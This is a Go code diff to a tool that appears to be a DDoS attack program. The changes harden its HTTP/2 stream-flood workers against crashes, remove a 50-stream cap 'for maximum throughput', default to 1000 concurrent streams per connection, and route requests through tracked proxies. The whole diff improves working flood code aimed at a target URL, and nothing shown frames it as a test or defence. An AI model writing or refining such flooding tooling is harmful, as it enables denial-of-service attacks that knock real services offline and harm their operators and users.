@@ -46,41 +46,95 @@ func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
 
 // http2StreamFloodWorkerWithPool floods server with HTTP/2 streams using connection pool
 func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL string) {
-	defer d.wg.Done()
+	defer func() {
+		// Recover from panics to prevent worker crashes
+		if r := recover(); r != nil {
+			atomic.AddInt64(&d.requestsFailed, 1)
+		}
+		d.wg.Done()
+	}()
+
+	// Check if context is initialized
+	if d.ctx == nil {
+		return
+	}
+
+	// Create a limiter for nested goroutines - use MaxStreamsPerConn directly
+	// Removed artificial 50 stream cap for maximum throughput
+	maxConcurrentStreams := d.config.MaxStreamsPerConn
+	if maxConcurrentStreams <= 0 {
+		maxConcurrentStreams = 1000 // Default if not set
+	}
+	limiter := NewGoroutineLimiter(maxConcurrentStreams)
+	defer limiter.Close()
 
 	for {
 		select {
 		case <-d.ctx.Done():
 			return
 		default:
-			// Create streams concurrently
+			// Create streams concurrently with goroutine limiting
 			atomic.AddInt64(&d.totalBatches, 1)
 			var wg sync.WaitGroup
-			successCount := int64(0)
+			var successCount int64 // Use atomic for thread-safe access
 
-			for i := 0; i < d.config.MaxStreamsPerConn; i++ {
+			// Use MaxStreamsPerConn directly without artificial cap
+			streamsToCreate := d.config.MaxStreamsPerConn
+			if streamsToCreate <= 0 {
+				streamsToCreate = 1000 // Default if not set
+			}
+
+			for i := 0; i < streamsToCreate; i++ {
 				wg.Add(1)
-				go func() {
+				limiter.Execute(func() {
 					defer wg.Done()
+					
+					// Recover from panics in stream goroutines
+					defer func() {
+						if r := recover(); r != nil {
+							atomic.AddInt64(&d.requestsFailed, 1)
+						}
+					}()
+
 					client := pool.GetClient()
 					if client == nil {
 						return
 					}
 
-					req, err := d.requestBuilder.(*RequestBuilder).BuildRequest()
+					// Ensure requestBuilder is initialized
+					if d.requestBuilder == nil {
+						d.requestBuilder = NewRequestBuilder(d.config)
+					}
+					
+					// Safe type assertion
+					rb, ok := d.requestBuilder.(*RequestBuilder)
+					if !ok || rb == nil {
+						atomic.AddInt64(&d.requestsFailed, 1)
+						return
+					}
+					
+					req, err := rb.BuildRequest()
 					if err != nil {
 						atomic.AddInt64(&d.requestsFailed, 1)
 						return
 					}
 
-					if d.sendHTTP2StreamRequestWithClient(client, req) {
-						successCount++
+					// Rate limiting: check if request is allowed
+					if d.rateLimiter != nil && !d.rateLimiter.Allow() {
+						atomic.AddInt64(&d.requestsFailed, 1)
+						return
 					}
-				}()
+
+					proxyURL := pool.GetProxyForClient(client)
+					success := d.sendHTTP2StreamRequestWithClient(client, req, proxyURL)
+					if success {
+						atomic.AddInt64(&successCount, 1)
+					}
+				})
 			}
 			wg.Wait()
 
-			if successCount > 0 {
+			if atomic.LoadInt64(&successCount) > 0 {
 				atomic.AddInt64(&d.successfulBatches, 1)
 			}
 		}
@@ -89,7 +143,7 @@ func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL 
 
 
 // sendHTTP2StreamRequestWithClient sends a request using the provided client (for pool-based workers)
-func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *http.Request) bool {
+func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *http.Request, proxyURL string) bool {
 	atomic.AddInt64(&d.activeConns, 1)
 	defer atomic.AddInt64(&d.activeConns, -1)
 
@@ -99,8 +153,13 @@ func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *
 	atomic.AddInt64(&d.requestsSent, 1)
 
 	resp, err := client.Do(req)
+	responseTime := time.Since(startTime)
+	
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
+		if proxyURL != "" {
+			d.markProxyFailure(proxyURL)
+		}
 		return false
 	}
 	defer resp.Body.Close()
@@ -108,9 +167,12 @@ func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *
 	// Always skip response reading for maximum efficiency
 	resp.Body.Close()
 
-	responseTime := time.Since(startTime)
 	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 	atomic.AddInt64(&d.requestsSuccess, 1)
+	
+	if proxyURL != "" {
+		d.markProxySuccess(proxyURL, responseTime)
+	}
 
 	return true
 }
